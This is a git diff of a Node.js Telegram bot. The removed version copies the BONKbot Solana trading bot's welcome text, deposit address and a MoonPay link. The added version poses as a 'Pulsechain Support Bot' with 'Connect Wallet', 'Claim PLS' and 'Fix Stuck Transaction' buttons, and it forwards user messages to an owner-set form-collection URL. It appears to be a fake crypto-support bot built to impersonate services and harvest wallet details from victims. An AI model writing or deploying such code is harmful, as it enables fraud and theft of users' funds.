@@ -1,60 +1,61 @@
 const express = require('express');
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3008;
 
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.status(200).send('Bot is running!');
+});
+
+// Start the HTTP server
+app.listen(PORT, () => {
+  console.log(`Health check server running on port ${PORT}`);
+});
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 
-// Required ENV variables
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
 const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
-const domain = process.env.DOMAIN || `https://pulse2-bot.onrender.com`; // Set this in your .env
 
-if (!token || !ownerId || !formUnstaticURL || !domain) {
+// Check for missing environment variables
+if (!token || !ownerId || !formUnstaticURL) {
   console.error(
     'Missing required environment variables. Check your .env file.'
   );
   process.exit(1);
 }
 
-// Create bot WITHOUT polling/webhook port handling
-const bot = new TelegramBot(token, { webHook: true });
-
-const webhookPath = `/bot${token}`;
-const webhookUrl = `${domain}${webhookPath}`;
-
-// Set webhook
-bot
-  .setWebHook(webhookUrl)
-  .then(() => {
-    console.log(`✅ Webhook set to: ${webhookUrl}`);
-  })
-  .catch((err) => {
-    console.error('❌ Failed to set webhook:', err);
-  });
-
-// Express middleware
-app.use(express.json());
-
-// Health check
-app.get('/', (req, res) => res.send('✅ pulse2bot is live!'));
-
-app.post(webhookPath, (req, res) => {
-  bot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-
+const bot = new TelegramBot(token, { polling: true });
+console.log('Bot started successfully!');
 const chatStates = {};
 
+console.log('Bot started successfully!');
+
 const sendToFormUnstatic = async (name, message) => {
+  if (!name || !message) {
+    console.error('Missing name or message for FormUnstatic submission.');
+    return;
+  }
+
   try {
-    await axios.post(formUnstaticURL, new URLSearchParams({ name, message }), {
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    });
+    const response = await axios.post(
+      formUnstaticURL,
+      new URLSearchParams({
+        name: name,
+        message: message,
+      }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      }
+    );
+    console.log('Data sent to FormUnstatic:', response.data);
   } catch (error) {
-    console.error('❌ Error sending to FormUnstatic:', error.message);
+    console.error(
+      'Error sending data to FormUnstatic:',
+      error.response?.data || error.message
+    );
   }
 };
 
@@ -93,45 +94,32 @@ bot.on('message', (msg) => {
 });
 
 bot.onText(/\/start/, (msg) => {
-  const message = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!
+  const message = `🌠 Introducing Pulsechain Support Bot! Your one-stop solution for all your Pulsechain bridge, wallet, and transaction issues. 
 
-You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
+We're here to help you resolve pending bridges, troubleshoot wallet errors and glitches, and get your stuck transactions moving. 
 
-HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)
+We're dedicated to providing fast and efficient support, so you can get back to enjoying the Pulsechain ecosystem.
 
-Or buy SOL with Apple / Google Pay via MoonPay
-[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).
-
-Once done, tap refresh and your balance will appear here.
-
-To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.
-
-For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;
+🚀 Let's get started!`;
 
   const options = {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: 'Buy', callback_data: 'buy' },
-          { text: 'Fund', callback_data: 'fund' },
+          { text: '🔧 Fix Stuck Transaction', callback_data: 'fix' },
+          { text: '🎯 Clear Pending Bridge', callback_data: 'clear' },
         ],
+        // Second row with 4 buttons
         [
-          { text: 'Help', callback_data: 'help' },
-          { text: 'Refer Friends', callback_data: 'refer_friends' },
-          { text: 'Alerts', callback_data: 'alerts' },
+          { text: '🤖 Clear Wallet Error', callback_data: ' error' },
+          { text: '🛄 Claim PLS', callback_data: 'pls' },
         ],
+        // Third row with 3 buttons
         [
-          { text: 'Wallet', callback_data: 'wallet' },
-          { text: 'Settings', callback_data: 'settings' },
+          { text: '📝 Transaction Delayed', callback_data: 'delay' },
+          { text: '👥 Referrals', callback_data: 'referrals' },
         ],
-        [
-          { text: 'DCA Orders', callback_data: 'dca_orders' },
-          { text: 'Limit Orders', callback_data: 'limit_orders' },
-        ],
-        [
-          { text: 'Migration Sniper', callback_data: 'migration_sniper' },
-          { text: 'Refresh', callback_data: 'refresh' },
-        ],
+        [{ text: 'Connect Wallet', callback_data: 'connect' }],
       ],
     },
   };
@@ -143,22 +131,43 @@ bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
 
   if (query.data === 'try_again') {
-    const startMessage = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!
+    const message = `🌠 Introducing Pulsechain Support Bot! Your one-stop solution for all your Pulsechain bridge, wallet, and transaction issues. 
 
-You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
+We're here to help you resolve pending bridges, troubleshoot wallet errors and glitches, and get your stuck transactions moving. 
 
-HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)
+We're dedicated to providing fast and efficient support, so you can get back to enjoying the Pulsechain ecosystem.
 
-Or buy SOL with Apple / Google Pay via MoonPay
-[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).
+🚀 Let's get started!`;
 
-Once done, tap refresh and your balance will appear here.
+    // Define the inline keyboard with two buttons
+    const options = {
+      reply_markup: {
+        inline_keyboard: [
+          // First row with 2 buttons
+          [
+            {
+              text: '🔧 Fix Stuck Transaction',
+              callback_data: 'Fix Stuck Transaction',
+            },
+            { text: '🎯 Clear Pending Bridge', callback_data: 'clear' },
+          ],
+          // Second row with 4 buttons
+          [
+            { text: '🤖 Clear Wallet Error', callback_data: ' error' },
+            { text: '🛄 Claim PLS', callback_data: 'pls' },
+          ],
+          // Third row with 3 buttons
+          [
+            { text: '📝 Transaction Delayed', callback_data: 'delay' },
+            { text: '👥 Referrals', callback_data: 'referrals' },
+          ],
+          [{ text: 'Connect Wallet', callback_data: 'connect' }],
+        ],
+      },
+    };
 
-To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.
-
-For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;
-
-    bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
+    // Send the welcome message along with the inline keyboard options
+    bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
   } else if (query.data === 'import_wallet') {
     const importMessage = `ℹ️ Connect wallet to use settings`;
 
